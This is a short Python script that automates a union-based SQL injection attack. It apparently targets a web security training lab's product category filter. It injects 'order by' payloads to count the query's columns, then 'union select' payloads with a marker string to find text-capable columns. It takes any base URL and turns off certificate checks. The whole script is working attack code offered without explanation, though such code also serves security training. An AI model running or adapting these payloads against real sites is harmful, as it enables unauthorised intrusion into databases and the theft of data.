import requests 
import urllib3 
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

s=requests.Session()
string="'tHvrUo'" ### If you got url with differnt path please change according to.
path="filter?category=Gifts" ### If you got url with differnt path please change according to.

def sql_number_col(s,url):
    
    for i in range(1,50):
        payload=f"'order by {i} -- "
        r=s.get(url+path+payload,verify=False)
        response=r.text
        if "Internal Server Error" in response:
            i=i-1
            return i 
    return 0

def string_sql_exploit(s,url,number_col):
    found_col=[]
    for i in range(1,number_col+1):
        list=['null']*number_col
        list[i-1]=string
        payload=f"'union select {','.join(list)} -- "
        response=s.get(url+path+payload,verify=False)
        
        if string.strip('\'') in response.text:
            found_col.append(i)
    return found_col
if __name__ ==  "__main__":
    try:
        url=input("Please enter base url : ")
        
        if not url:
            raise ValueError("Please enter valid input. : ")
        
        print(f" Finding out number of columns please wait. : ")
        
        number_col=(sql_number_col(s,url))
        if number_col >0:
            print(f"Number of columns returd by query is : {(number_col)}")
        else:
            print(f" Column not found {str(number_col)} ")
            sys.exit()
           
        string_column_number=string_sql_exploit(s,url,number_col) 
        if string_column_number:
            print(f"[+] String or text value is supported by column are : {(string_column_number)} ")
        else:
            print("[-] SQL Injection unsuccessful : ")
        
    except ValueError as e :
        print(e)